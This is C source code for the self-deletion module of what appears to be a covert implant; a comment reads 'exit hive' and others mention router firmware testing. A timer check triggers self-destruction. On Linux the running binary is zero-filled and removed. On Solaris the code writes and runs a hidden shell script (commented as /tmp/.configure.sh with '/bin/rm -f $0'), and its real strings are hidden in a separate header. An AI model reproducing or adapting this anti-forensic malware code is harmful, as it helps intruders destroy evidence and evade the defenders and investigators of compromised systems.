//#define _USE_32BIT_TIME_T
#define _INC_STAT_INL
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "self_delete.h"
#include "debug.h"
#include "compat.h"
#include "proj_strings.h"

#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <utime.h>
#define _stat stat

void check_timer(char* filepath, unsigned long delete_delay)
{
	struct stat st;
	int ret;
	time_t timediff;

	ret = _stat( filepath, &st );

	if ( ret < 0 )
	{
		// TODO: return error, exit?
		//Do not want to exit, this will stop the process and leave the executable...
		//Added a self_delete, if you can't stat the file, it's gone as well as our timing information.
		DLX(1, printf("No time file exists, self_delete will occur now...\n"));
#if defined LINUX || SOLARIS
		markTermination((char *)sdlfp);
#endif
		self_delete();
		exit( 0 );
	}
	else if ( ret == 0 )
	{	
		timediff = time( NULL ) - st.st_mtime;
		// D( printf( " DEBUG: %s, %d: Current time =  %ld, File time = %ld, delta = %ld\n", __FILE__, __LINE__, time(NULL), st.st_mtime, timediff); )

		if (timediff >= 0) {
			if ( timediff > (time_t)delete_delay )
			{
				markTermination((char *)sdlfp);
				self_delete();
				// not reached
			}
		} else {
			DLX(4, printf("Negative time difference.\n"));
		}
	}

	return;
}


#if defined LINUX
static int shred_file(char* filename);


int shred_file(char* filename)
{
	
	int ret, fd, i;
	struct stat statbuf;

	fd = stat( (char*)filename, &statbuf);

	if ( fd < 0 )
	{
		DLX(1, printf( "stat of \"%s\" failed; file size unknown.\n", filename));
		ret = -1;
	}
	else
	{
		DLX(1, printf( "\"%s\" is %i bytes in size.\n", filename, (int)statbuf.st_size ));
		fd = open( (char *)filename, O_WRONLY );

		if ( fd < 0 )
		{
			DLX(1, perror( "open" ));
			ret = -2;
		}
		else
		{
			/* this is zero-ing out the physical file on disk before deleting */
			/* this is slow, but it works */
			for ( i = 0; i < statbuf.st_size; i++ )
			{
				ret = write( fd, "\0", 1 );
			}
			ret = 0;
		}

		close( fd );
	}

// this section of code taken from SecureDelete() in Shell.c
#ifdef _USE_UNLINK
    unlink( filename );
#else
    if ( remove( filename ) != 0 )
    {
        // so far, the only platform that has not supported remove() is the
        // DD-WRT v24-sp2 (11/02/09) std firmware flashed to a Linksys
        // WRT54G v1.0 for surrogate testing of MikroTik MIPS-LE.
        // Given prior successful testing with the MikroTik RouterOS on 
        // other hardware, remove() is expected to work.....
        // With DD-WRT, remove() fails with "can't resolve symbol 'remove'"
        DLX(1, perror( "remove()"));
		ret = -1;
    }
#endif

	return ret;
}

void self_delete()
{
	char* self;

	self = calloc(512,1);

	//Don't shred the configuration file, use contents to determine when self_delete executed...
	// shred the configuration file
	//D( printf (" DEBUG: shredding configuration file\n" ); )
	//shred_file((char*)sdfp);

	//ret = readlink( "/proc/self/exe",self, 511);
	(void) readlink( (char*)sdp, self, 511);
	DLX(3, printf("readlink reads => %s\n", self));

	// shred self
	DLX(1, printf ("shredding self\n"));
	shred_file(self);

	if(self != NULL)
	{
		free(self);
	}

	exit(0);
}
#elif defined SOLARIS
void self_delete()
{
	char* self = NULL;
	FILE* f;
//	char* line1 = "#!/bin/sh\n";
	char* line1 = sdsl1;
	char line2[256];
//	char* line3 = "/bin/rm -f $0\n";
	char* line3 = sdsl3;
//	char* shell = "/bin/sh";

	// delete the timer file
	//unlink((char*)sdfp);        Do not delete the timer file for 2.5.1

	// determine /path/to/running_binary
	self = (char *)getexecname();
	DLX(1, printf("getexecname returns => %s\n", self));
	
	//create the script line to delete the binary on disk
	memset(line2,0,256);
	if( strstr(self, exe_path) == NULL)
	{
		//sprintf(line2, "/bin/rm -f %s/%s\n",exe_path,self);
		sprintf(line2, sds8l2,exe_path,self);
	}
	else
	{
		//sprintf(line2, "/bin/rm -f %s\n",self);
		sprintf(line2, sds9l2, self);
	}
	
	//write script to disk
	//f = fopen("/tmp/.configure.sh","w");
	f = fopen(sdsfn, "w");
	fwrite(line1,strlen(line1),1,f);
	fwrite(line2,strlen(line2),1,f);
	fwrite(line3,strlen(line3),1,f);
	fclose(f);

	//make the script executable
	//system("chmod +x /tmp/.configure.sh");
	system(sdsfc);
	//execute the script
	//execl(shell, shell, "-c", "/tmp/.configure.sh &",NULL);
	execl(sdss, sdss, "-c", sdsfe, NULL);
	
	//exit hive
	exit(0);
}
#endif

#if defined LINUX || SOLARIS

void update_file(char* filepath)
{
	int ret=1234;
	FILE* timeFile;
	ret = utime(filepath, NULL);
	DLX(5, printf("Initial return from update_file utime = %i\n", ret));
	if (ret != 0)
	{
		DLX(3, perror("Initial update via utime failed."));
                DLX(3, printf("Trying to open file %s.\n", filepath));
		timeFile = fopen( filepath, "w");   //Create the file...
		if (timeFile == NULL)
		{
			DLX(3, perror("Could not open via update_file"));
		}
		else
		{
			DLX(3, printf("Closing file %s.", filepath));
			fclose(timeFile);
		}
	}
	else
	{
		DLX(5, printf("File %s updated correctly via utime...\n", filepath));
	}
	return; 
}

void markTermination(char* filepath)
{
	int ret=1234;
	size_t length;
	struct tm timestruct;
	time_t now;
	char timeStamp[20];
	FILE* timeFile;

	ret = utime(filepath, NULL);
	DLX(4, printf("Initial return from update_file utime = %i\n", ret));
	if (ret != 0)
	{
		DLX(4, printf("Trying to open file %s.\n", filepath));
		timeFile = fopen( filepath, "w");   //Create the file...
		if (timeFile == NULL)
		{
			DLX(4, perror("Could not open via update_file"));
		}
		else
		{
			now = time(NULL);
			timestruct= *(localtime(&now));
			length=strftime(timeStamp, 20, "%y%m%d%H%M%S", &timestruct);
			if (length<=0)
			{
				DLX(4, printf("Could not create timeStamp.\n"));
			}
			else if (length > 20)
			{
				DLX(4, printf("Illegal timeStamp will not be used.\n"));
			}
			else
			{
				DLX(4, printf("Writing timeStamp %s to file.\n", timeStamp));
				fprintf(timeFile, "%s\n", timeStamp); 
			}
			DLX(4, printf("Closing file %s.\n", filepath));
			fclose(timeFile);
		}
	}
	else
	{
		D( printf(" DEBUG markTermination: ERROR occurred since the file %s now exists...\n\n\n", filepath); )
	}

	return; 
}
#endif
